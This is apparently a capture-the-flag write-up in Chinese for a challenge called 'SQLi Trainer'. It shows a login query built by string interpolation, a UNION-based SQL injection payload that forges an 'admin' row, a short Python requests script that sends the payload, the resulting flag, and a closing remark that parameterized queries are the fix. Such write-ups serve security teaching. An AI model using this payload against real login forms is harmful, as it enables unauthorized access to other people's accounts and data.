# SQLi Trainer

## 题目简述

登录接口把用户名和密码直接插入 SQLite 查询。数据库只有随机密码的 `user` 记录，而服务端要求查询结果恰好是一行且首列为 `admin`。目标是通过 UNION 注入伪造这行结果。

## 解题过程

查询结构为：

```python
query = f"SELECT name FROM users WHERE name = '{username}' AND pass = '{password}'"
```

结果只有一列，因此 UNION 分支也只需返回一列字符串。把用户名设为：

```sql
' UNION SELECT 'admin';--
```

拼接后，原查询条件被关闭，`UNION SELECT 'admin'` 产生唯一一行，注释截断剩余密码部分。最小请求如下：

```python
import requests

base_url = input("题目根地址：").rstrip("/")
data = {
    "username": "' UNION SELECT 'admin';-- ",
    "password": "",
}
print(requests.post(f"{base_url}/login", data=data).json())
```

服务端检查 `result[0][0] == "admin"` 后返回：

```text
grey{SQLi_1s_st1ll_rel3v4nt_1n_2024}
```

## 方法总结

UNION 注入需要匹配原查询列数和兼容类型。本题只有一个文本列，所以可直接合成服务器期望的授权记录。正确修复是参数化查询，而不是过滤引号或 SQL 关键字。
